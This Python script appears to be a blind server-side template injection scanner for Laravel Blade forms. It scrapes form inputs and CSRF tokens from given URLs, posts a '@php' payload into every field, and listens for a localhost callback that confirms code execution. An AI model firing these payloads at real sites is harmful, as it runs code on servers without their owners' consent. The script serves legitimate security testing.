import re
import sys
import requests
import subprocess

def locate_input_points(html):
    """
    This function finds all text input tags and returns their names
    """

    # find all input tags including token
    input_collection = re.findall(r"(<input [a-zA-Z0-9 _=\"\-'\\\\]*>)+", str(html))
    textarea_collection = re.findall(r"(<textarea [a-zA-Z0-9 _:;=\"\-'\\\\]*>)+", str(html))
    total_inputs = input_collection+textarea_collection

    all_names = []  # array containing necessary input tags which will be used later
    for elem in total_inputs:  # loop through inputs, remove token & submit input
        if "_token" in elem:
            total_inputs.remove(elem)
        elif "type='submit'" in elem:
            total_inputs.remove(elem)

    for inp in total_inputs:  # filter through remaining valid inputs storing the names
        all_names += re.findall(r"(name=[\\\\'a-zA-Z0-9\"'\\\\']+)", inp)

    final_names = []
    for elem in all_names:  # Clean names
        temp_name = elem.replace("name=", "")
        temp_name = temp_name.replace("'", "")
        final_names.append(temp_name)

    return final_names


def filter_links(all_urls):
    """
    This function checks for duplicates in the total collection of links in the website and removes them
    """

    all_urls = list(dict.fromkeys(all_urls))
    return all_urls


def post_url(html):
    """
    This function finds all form action links in a page, and returns only the required form action links
    """

    post_link = re.findall(r"action=([a-zA-Z0-9 _:;=./\"'\\\\]+)", html)[0]

    #for link in post_links:
    formatted_link = re.findall(r"(http://[a-zA-Z0-9_:;=./\\\\]+)", post_link)[0]
    #formatted_links.append(formatted_link[0])

    return formatted_link


def get_token(html):
    """
    This function grabs the token for each given form
    """

    token = re.findall(r'<input type="hidden" name="_token" value="(.*)"', html)[0]
    return token


def get_forms(html):
    """
    This function takes html and finds all forms and their encapsulated html. It will extract action links and their inputs
    and pair them together.
    """

    form_groups = re.findall(r"(action=[a-zA-Z0-9 _:;=./\"\-<>\s'\\\\]+</form>)+", html)

    link_groups = {}
    for group in form_groups:
        action_link = post_url(group)
        input_links = locate_input_points(group)
        link_groups[action_link] = input_links

    return link_groups


def test_blind_posterior(urls):
    """
    This function performs SSTI on all forms in pages. This works by sending a connection request to a socket
    server that will run after all forms have been filled. The socket server will then confirm injection success based
    on if a connection is received or not.
    """

    for url in urls:
        session = requests.session()
        front = session.get(url)

        try:
            token = get_token(front.text)
            cookies = session.cookies

            post_data = {}
            groups = get_forms(front.text)

            for group in groups:
                # Get the inputs for each form group iteratively
                inputs = groups[group]

                for inp in inputs:  # Give each input a value and add to dictionary
                    post_data[inp] = f"""@php 
                                              try{{
                                                  $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
                                                  $url = $protocol . $_SERVER['SERVER_NAME'] . ":". $_SERVER['SERVER_PORT'] . $_SERVER['REQUEST_URI']; 
                                                  $sock = fsockopen('localhost', 9000);
                                                  fwrite($sock, 'Injection detected from form {group}, on page: {url}. Code was executed on '. $url); 
                                                  fclose($sock);
                                              }}
                                              catch(Exception $e){{}}
                                         @endphp"""
                post_data["_token"] = token  # Add token last
                requests.post(group, post_data, cookies=cookies)

        except IndexError:
            continue

    server_instance = subprocess.Popen(['python', 'SocketServer.py', ' '.join(urls)])
    while server_instance.poll() is None:
        if(server_instance.poll() != None):
            break
        pass


urls = sys.argv[1]
urls_list = list(urls.split(" "))
test_blind_posterior(urls_list)
